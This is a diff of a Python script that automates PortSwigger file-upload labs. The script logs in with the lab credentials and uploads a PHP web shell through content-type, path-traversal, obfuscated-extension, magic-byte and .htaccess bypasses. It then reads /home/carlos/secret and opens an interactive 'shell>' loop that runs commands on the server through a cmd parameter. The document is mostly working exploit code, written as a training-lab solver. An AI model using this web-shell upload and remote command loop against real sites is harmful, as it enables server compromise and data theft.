@@ -9,29 +9,52 @@ This script automatically exploits six of the labs of portswigger:
 
 Side note: The files has to be manually kept in.
 """ 
-from pathlib import Path
-import requests, re, payload_injection, os, dotenv, json, sys
-
-PYTHON_PATH = Path(__file__).parent.parent
-
-sys.path.append(str(PYTHON_PATH))
-from config import parse_args, is_success
-args, proxy = parse_args()
-
-PROJECT_ROOT = PYTHON_PATH.resolve()
-dotenv.load_dotenv(dotenv_path="../.env")
-
+try:
+    from pathlib import Path
+    import requests, re, os, json, sys, dotenv, bs4
+    sys.path.append(str(Path(__file__).parent.parent))
+    from config import parse_args, is_success
+except ImportError as e:
+    print(e)
 
 class FileUpload: 
     def __init__(self, url):
+        self.PROJECT_ROOT = Path(__file__).parent.parent
+        args, proxy = parse_args()
+        dotenv.load_dotenv(dotenv_path=f"{self.PROJECT_ROOT}/.env")
         self.url = url.rstrip("/")
-        self.file_location = PROJECT_ROOT / os.getenv('FILE_TO_UPLOAD')
+        self.file_location = self.PROJECT_ROOT / os.getenv('FILE_TO_UPLOAD')
         self.file_name = ""
         self.session = requests.Session()
 
         if proxy:
             self.session.proxies.update(proxy)  
         self.session.verify = False
+        
+    def start_payload(self, url, payload):
+        try:
+            url = f"{url}?cmd={payload}"
+            data = requests.get(url)
+            html_data = data.text
+            result = self.beautify(html_data)
+            return result
+        except Exception as e:
+            print(f"{e}")
+            return False
+
+    def beautify(self, result, tag="pre"):
+        try:
+            soup = bs4.BeautifulSoup(result, "html.parser")
+            pre = soup.find(tag)
+            if pre:
+                text = pre.get_text(strip=True)
+                return text if text else None
+            else:
+                return None
+        except Exception as e:
+            print(f"{e}")
+            return False
+
 
     def csrf_token_extract(self, url):
         try:
@@ -48,11 +71,11 @@ class FileUpload:
             print(f"Unexpected error: {e}")
             return None
         
-    def file_upload(self, csrf, content_type=None, path_traversal=False, obsfucated_extension=False, magic_byte=False):
+    def file_upload(self, csrf, content_type=False, path_traversal=False, obsfucated_extension=False, magic_byte=False):
         if magic_byte:
-            self.file_location = PROJECT_ROOT / os.getenv('MAGIC_BYTE_FILE')
+            self.file_location = self.PROJECT_ROOT / os.getenv('MAGIC_BYTE_FILE')
         else:
-            self.file_location = PROJECT_ROOT / os.getenv('FILE_TO_UPLOAD')
+            self.file_location = self.PROJECT_ROOT / os.getenv('FILE_TO_UPLOAD')
         if not self.file_location:
             print(f"The file to be uploaded is not set in the environment. Be sure to set the environment correctly. ദ്ദി ˉ͈̀꒳ˉ͈́ )✧")
             return None
@@ -98,7 +121,7 @@ class FileUpload:
             exploit_url = f"{self.url}/files/{self.file_name}"
         else:
             exploit_url = f"{self.url}/files/avatars/{self.file_name}"
-        solve_lab = payload_injection.start_payload(exploit_url, "cat /home/carlos/secret") #testing if exploit works
+        solve_lab = self.start_payload(exploit_url, "cat /home/carlos/secret") #testing if exploit works
         if solve_lab is None:
             print("Web shell verification failed")
             return False
@@ -115,7 +138,7 @@ class FileUpload:
                     print("Exiting shell.....")
                     break
 
-                file_upload_web_shell =  payload_injection.start_payload(exploit_url, payload)
+                file_upload_web_shell =  self.start_payload(exploit_url, payload)
                 print(file_upload_web_shell)
             except EOFError:
                 print("\nExiting shell...")
@@ -124,10 +147,10 @@ class FileUpload:
             except Exception as e:
                 print(f"Error: {e}")
                 error_occured = True
-            finally:
-                if not is_success(self) or error_occured:
-                    return False
-        return True
+        if not is_success(self) or error_occured:
+            return False
+        else:
+            return True
     
     def solve_tutorial(self, exploit_condition, type_of_exploit, burpsuite=False):
         if not exploit_condition:
@@ -178,12 +201,12 @@ class FileUpload:
             'user':'wiener'
         }
         try:
-            with open(PROJECT_ROOT / os.getenv("HTACCESS_FILE", "rb")) as f:
+            with open(self.PROJECT_ROOT / os.getenv("HTACCESS_FILE", "rb")) as f:
                 htaccess = {
                     "avatar": (".htaccess", f)
                     }
                 htaccess_upload_post = self.session.post(url=f"{self.url}/my-account/avatar", data=data, files=htaccess, verify=False)
-            with open(PROJECT_ROOT / os.getenv("FILE_TO_UPLOAD"), "rb") as f:
+            with open(self.PROJECT_ROOT / os.getenv("FILE_TO_UPLOAD"), "rb") as f:
                 file = {
                     "avatar": ("web_shell.php2", f)
                 }
@@ -198,7 +221,7 @@ class FileUpload:
             print(f"File was not found. Check if file is readable ;-)") 
         
         exploit_url = f"{self.url}/files/avatars/web_shell.php2"
-        if payload_injection.start_payload(exploit_url, "whoami")  is None:
+        if self.start_payload(exploit_url, "whoami")  is None:
                 return False
         print("Exploitation was successfull, The web shell has spawned.\nSide note: To stop just type stop.")
         while True:
@@ -206,7 +229,7 @@ class FileUpload:
                 payload = input("shell> ").strip() 
                 if payload.lower() in ["stop", "exit", "quit"]:
                     break
-                file_upload_web_shell =  payload_injection.start_payload(exploit_url, payload)
+                file_upload_web_shell =  self.start_payload(exploit_url, payload)
                 print(file_upload_web_shell)
             except KeyboardInterrupt:
                 print("\n\nKeyBoard Interuption. Exiting shell...")
@@ -237,6 +260,7 @@ class FileUpload:
         csrf_token = self.csrf_token_extract(f"{self.url}/login")
         if not csrf_token:
             print(f"CSRF was not found. You might have to check the website (ᵕ—ᴗ—)")
+            return False
         login_info = {
             "username": "wiener", #credentials given in website
             "password": "peter", #credentials given in website
@@ -244,6 +268,9 @@ class FileUpload:
         }
         try:
             self.login_page_post = self.session.post(url=f"{self.url}/login", verify=False, data=login_info, allow_redirects=True)
+            if not self.login_page_post:
+                return False
+            return True
 
         except requests.exceptions.Timeout:
             print("Error: Request timed out")
@@ -251,7 +278,11 @@ class FileUpload:
         
         except requests.exceptions.RequestException as e:
             print(f"Error: Network request failed - {e}")
-        
+
+    def main(self):
+        if not self.login():
+            print("Login was not successfull")
+            return False
         exploit_methods = [
         ("Simple file upload", self.simple_file_upload, "simple_file_upload"),
         ("Content-Type bypass", self.content_type_file_upload, "content_type"),
@@ -279,13 +310,8 @@ class FileUpload:
                 break
         print("All exploits failed. Sorry you will have to search for better programmer than me. (╥﹏╥)")
         return False
-    
-def main():
-    url = input("Enter the link to exploit: ")
-    start = FileUpload(url)
-    start.login()
-
-
 
 if __name__ == "__main__":
-    main()
+    url = input("Enter the link to exploit: ")
+    start = FileUpload(url)
+    start.main()
